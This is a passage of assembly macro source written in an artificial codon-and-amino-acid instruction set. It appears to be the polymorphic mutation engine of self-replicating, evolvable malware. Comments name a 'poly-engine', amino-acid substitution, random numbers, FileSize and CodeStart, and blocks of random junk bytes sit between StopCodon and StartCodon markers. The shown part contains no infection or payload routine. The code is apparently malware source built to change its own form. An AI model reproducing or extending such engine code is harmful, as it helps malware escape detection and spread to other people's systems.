        _addsaved       ; BC1=BC1+(-BC2)
               _JnzDown     ; Simulate JzDown
                       _nopREAL     ; BC1=0
                       _nopREAL
                       _add0001
                       _JnzDown
                               _nopREAL     ; Not equal
                               _pop
                               _push
                               _call        ; jmp to RPBlock1End
       ; First 4 bytes are equal
               _pop         ; Old Call-address
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
    BigNum=((RPBlock2End1-RPBlock2Start1)*8)
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
db StopCodon
db 239
db 143
db 29
db 32
db 183
db 221
db 133
db StartCodon
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
               _save
               _getEIP
           RPBlock2Start1:
db StopCodon
db 177
db 220
db 134
db 165
db 100
db 187
db 41
db 5
db 64
db 105
db 221
db 86
db 135
db 14
db 205
db 201
db 238
db 40
db 36
db 201
db 206
db 42
db 163
db 239
db 23
db 110
db 107
db 171
db 160
db 173
db 74
db 114
db 136
db 239
db StartCodon
    BigNum=3
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
db StopCodon
db 213
db 26
db 107
db 169
db 143
db 245
db 109
db 53
db 41
db 104
db 63
db 230
db 240
db 162
db 211
db 247
db 11
db 71
db 46
db 103
db 15
db 162
db 116
db 20
db 23
db 241
db 120
db StartCodon
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
db StopCodon
db 69
db 84
db 74
db 94
db 105
db 92
db 219
db 185
db 51
db 72
db 111
db 248
db 74
db StartCodon
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
db StopCodon
db 222
db 242
db 230
db 28
db 127
db 135
db 150
db 57
db 47
db 210
db 70
db 128
db 213
db 196
db 21
db 115
db 98
db 177
db 128
db 116
db 30
db 102
db 169
db 187
db 15
db 119
db 90
db 119
db 200
db 208
db 187
db 68
db 3
db 45
db 239
db 1
db 190
db 135
db 94
db StartCodon
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
               _addsaved
               _push                               ; Save Addresse at Stack
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
    BigNum=3
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
db StopCodon
db 87
db 192
db 134
db 71
db 119
db 123
db 52
db 109
db 129
db 196
db 74
db 18
db 228
db 67
db 59
db 205
db 237
db 231
db 39
db 7
db 77
db 198
db 70
db 51
db 2
db 125
db 41
db 138
db 149
db 40
db 82
db 156
db 198
db 218
db 121
db 150
db 63
db 37
db 142
db 33
db 122
db 154
db 135
db 48
db 215
db 218
db 121
db 59
db 95
db 230
db 158
db 149
db 29
db 230
db 118
db 214
db 194
db StartCodon
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
               _save
    _getDO
    BigNum=RPAminoAcid2-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
db StopCodon
db 113
db 191
db 177
db 94
db 166
db StartCodon
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
db StopCodon
db 241
db 205
db 37
db 178
db 201
db 233
db 42
db 122
db 114
db 206
db 246
db 211
db 123
db 83
db 233
db 124
db 117
db 75
db 55
db 0
db 79
db 188
db 205
db 54
db 153
db 10
db 100
db 63
db 86
db 115
db 204
db 12
db 29
db 164
db 169
db 204
db 15
db 148
db 128
db 83
db 199
db 31
db 170
db 99
db 206
db 14
db 170
db 6
db 60
db 113
db 191
db 58
db 164
db StartCodon
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
db StopCodon
db 141
db 218
db 45
db StartCodon
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
               _getdata
               _shl         ; *8
               _save
               _nopsD        ; Get start of Alphabeth in Map
               _addsaved
    BigNum=4
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
db StopCodon
db 3
db 145
db StartCodon
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
db StopCodon
db 32
db 184
db 135
db 144
db 79
db 251
db 84
db 41
db 117
db 222
db 249
db 14
db StartCodon
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
               _getdata
               _save
               _nopsB       ; second 4 bytes
        _push           ; save BC1
_pushall
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
_popall
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
db StopCodon
db 138
db 49
db 199
db StartCodon
        _getdata
db StopCodon
db 171
db 140
db 56
db 196
db 47
db 178
db 113
db 200
db 102
db 66
db 33
db 106
db StartCodon
        _sub0001        ; BC1=0xFFFFFFFF
        _xor            ; BC1=0xFFFFFFFF XOR BC2
        _add0001        ; BC1=-BC2
        _save           ; BC2=-BC2
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+(-BC2)
               _JnzDown
                       _nopREAL     ; BC1=0
                       _pop
                       _push
                       _call        ; RPBlock2End
               _push        ; not equal! trash to stack
           RPBlock1End1:        ; Not equal amino acids
               _pop         ; remove "call"-return address
               _pop         ; RPBlock1End-Jmp Address
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
    BigNum=15
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
db StopCodon
db 24
db 165
db 58
db 37
db 27
db 188
db 56
db 165
db 203
db 112
db 171
db 128
db 109
db StartCodon
        _saveWrtOff             ; BA1=RegC
db StopCodon
db 134
db 57
db 91
db 176
db 191
db 102
db 40
db 17
db 119
db 51
db 176
db 147
db 60
db 66
db 162
db 101
db 45
db 100
db 31
db 49
db 247
db 231
db 148
db 99
db 96
db 158
db 121
db 47
db 213
db 27
db 127
db 23
db 186
db 87
db 126
db 49
db 36
db 177
db 130
db 6
db 45
db 60
db 180
db 120
db 54
db 22
db 63
db 12
db 227
db 216
db 204
db 70
db 55
db 68
db 153
db 14
db 182
db 157
db 222
db 238
db 129
db 96
db 183
db 55
db 173
db 176
db 65
db 225
db 219
db 173
db 29
db 156
db 94
db 123
db 18
db 112
db 45
db 102
db 215
db 102
db 57
db 189
db 57
db 62
db 201
db 150
db 29
db 156
db 164
db 162
db 246
db 188
db 145
db 143
db 110
db 133
db 247
db 17
db 104
db StartCodon
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
               _save
    _getDO
    BigNum=RandomNumber-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
               _getdata     ; BC1=random
               _shr         ; BC1=random >> 15 (to get new small random number without calling the 32bit RND engine again)
               _and         ; BC1=(random >> 15) % 0000 1111b
       _JnzUp               ; If not zero -> Next loop!
       ; Not found any equivalences...
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
    BigNum=((RPBlock3End1-RPBlock3Start1)*8)
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _save
       _getEIP
     RPBlock3Start1:
    BigNum=3
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
db StopCodon
db 205
db StartCodon
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _addsaved
       _call        ; jmp to end of poly-engine: RPBlock3End
     RPBlock2End1:      ; Equal amino acids found
       _pop         ; remove "call"-return address
       _pop         ; RPBlock2End-Jmp Address
db StopCodon
db 216
db 92
db 121
db 33
db 128
db 189
db 34
db 63
db 100
db 56
db 3
db 92
db 126
db 91
db 147
db 203
db 73
db 61
db 169
db 132
db 235
db 88
db 219
db 83
db 121
db 214
db 123
db 166
db 191
db 103
db 117
db 40
db 95
db StartCodon
    _getDO
db StopCodon
db 110
db 47
db 188
db 169
db 18
db 89
db 75
db 2
db 14
db 193
db 161
db 226
db 110
db 125
db 143
db 176
db StartCodon
    BigNum=MapPointer-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
db StopCodon
db 108
db 154
db 167
db 150
db 171
db 194
db 197
db 166
db 70
db 91
db 125
db 194
db 1
db 211
db 195
db 189
db 160
db 255
db 254
db 10
db 173
db 238
db 181
db 69
db 241
db 114
db 64
db 84
db 126
db 185
db 86
db 185
db 145
db 234
db 2
db 167
db 175
db 114
db 24
db 103
db 213
db 175
db 95
db 42
db 91
db 217
db 170
db 204
db 97
db 96
db 60
db 232
db 172
db 215
db 97
db 171
db 73
db 127
db 138
db 168
db 188
db 243
db 103
db 205
db 159
db StartCodon
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
db StopCodon
db 142
db 18
db 245
db 137
db 48
db 27
db 220
db 104
db 252
db 51
db 248
db 220
db 143
db 213
db 216
db 146
db 168
db 85
db 207
db 218
db 104
db 199
db 15
db 41
db 215
db 65
db 190
db 84
db 153
db 92
db 218
db 125
db 88
db 142
db 120
db 98
db StartCodon
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _getdata
    BigNum=(CodeStart+(StAmino-start))
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
db StopCodon
db 158
db 145
db 98
db 55
db 235
db 181
db 69
db 238
db 115
db 61
db 67
db 72
db 252
db 205
db 17
db 56
db 200
db 245
db 138
db 99
db 250
db 48
db 201
db 155
db 225
db 44
db 129
db 120
db 167
db 86
db 49
db 24
db 98
db 136
db 192
db 119
db 23
db 241
db 127
db 237
db 49
db 84
db 136
db 214
db 58
db 147
db 44
db 62
db 17
db 195
db 212
db 165
db 242
db 6
db 226
db 169
db 33
db 216
db 75
db StartCodon
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _nopdD
    _getDO
    BigNum=RPAminoAcid1-DataOffset
    AlreadyStarted=0
    if BigNum<25
db StopCodon
db 103
db 198
db 189
db 190
db 95
db 171
db 232
db 150
db 196
db 30
db 193
db 186
db 111
db 126
db 9
db 86
db 39
db 235
db 33
db 162
db 221
db 19
db 4
db 244
db 153
db 105
db 198
db 245
db 169
db 67
db 15
db 212
db 174
db 109
db 254
db 15
db 201
db 75
db 112
db 93
db 249
db 202
db 180
db 141
db 154
db 126
db 145
db 214
db 188
db 253
db 234
db 154
db 11
db 51
db 170
db 52
db 116
db 208
db 15
db 194
db 230
db 17
db 138
db 191
db 190
db 102
db 89
db 33
db 151
db 117
db 107
db 169
db 115
db 52
db 138
db 228
db 0
db 97
db 97
db 58
db 43
db 164
db 74
db 99
db 58
db 42
db 93
db 70
db 157
db 143
db 49
db 173
db 4
db 168
db 176
db 146
db 185
db 201
db 91
db 103
db 17
db 86
db 192
db 34
db 34
db 195
db 145
db 163
db StartCodon
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _getdata
       _nopdA
    _getDO
    BigNum=RPAminoAcid2-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _getdata
       _nopdB
db StopCodon
db 156
db 161
db 134
db StartCodon
_save           ; BC2=BC1
db StopCodon
db 29
db 105
db 234
db 190
db 110
db 141
db 91
db 86
db 86
db 146
db 77
db 148
db 216
db 110
db 110
db 68
db 131
db 251
db 176
db 107
db 112
db 179
db 204
db 146
db 44
db 176
db 54
db 64
db 144
db 16
db 81
db 213
db 128
db 194
db 67
db 127
db 7
db 34
db 183
db 210
db 240
db 94
db 222
db 239
db 21
db 182
db 42
db 221
db 69
db 224
db 11
db 109
db 229
db 154
db 213
db 23
db 170
db 185
db 242
db 77
db 64
db StartCodon
_xor            ; BC1=BC1 XOR BC2 = 0
    _getDO
    BigNum=FileSize-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
db StopCodon
db 111
db 150
db 126
db 243
db 131
db 128
db 57
db 112
db 8
db 51
db 128
db 180
db 1
db 85
db 223
db 129
db 186
db 237
db 65
db 237
db 198
db 125
db 44
db 155
db 86
db 147
db 227
db 137
db 36
db 38
db 26
db 238
db 190
db 96
db 51
db 26
db 137
db 230
db 165
db 78
db 193
db 115
db 7
db 47
db 243
db 89
db StartCodon
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
db StopCodon
db 84
db 47
db 93
db 208
db 145
db 249
db 74
db 160
db 8
db 76
db 170
db 50
db 61
db 193
db 95
db 53
db 126
db 192
db 147
db 28
db 58
db 34
db 207
db 162
db 14
db 47
db 184
db 177
db 7
db 137
db 7
db 245
db 121
db 88
db 114
db 87
db 87
db 0
db 153
db 13
db 174
db 212
db 36
db 95
db 48
db 104
db 95
db 115
db 199
db 243
db 116
db 59
db 138
db 82
db 252
db 81
db 41
db 130
db 148
db 246
db 4
db 129
db 11
db 76
db 39
db 244
db 9
db 205
db 191
db 38
db 139
db 42
db 157
db StartCodon
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
db StopCodon
db 89
db 201
db 172
db 132
db 110
db 193
db 13
db 146
db 98
db 131
db 145
db 240
db 146
db 216
db 33
db 109
db 91
db 214
db 118
db 212
db 64
db 164
db 233
db 118
db 62
db 29
db 120
db 74
db 208
db 131
db 224
db 95
db 8
db 86
db 223
db 122
db 97
db 42
db 201
db 209
db 153
db StartCodon
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _getdata
    BigNum=(0xFFFFFFFF-(CodeStart+(StAmino-start))-1000)
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
